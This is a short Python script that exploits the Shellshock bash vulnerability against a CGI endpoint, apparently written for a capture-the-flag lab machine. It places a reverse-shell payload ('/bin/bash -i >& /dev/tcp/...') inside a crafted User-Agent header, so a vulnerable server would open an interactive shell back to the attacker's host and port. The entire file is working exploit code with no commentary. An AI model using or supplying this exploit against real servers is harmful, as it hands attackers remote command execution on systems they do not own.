import requests

ip = "10.129.197.78"
url = 'http://%s/cgi-bin/user.sh' %(ip)

LHost = "10.10.14.109"
LPort = "3377"
payload = "/bin/bash -i >& /dev/tcp/%s/%s 0>&1" %(LHost, LPort)

print(url)
print(payload)

headers = {
    'User-Agent': "() { :; }; echo; %s;" %(payload)
}
response = requests.get(url, headers=headers)

print(response.text)
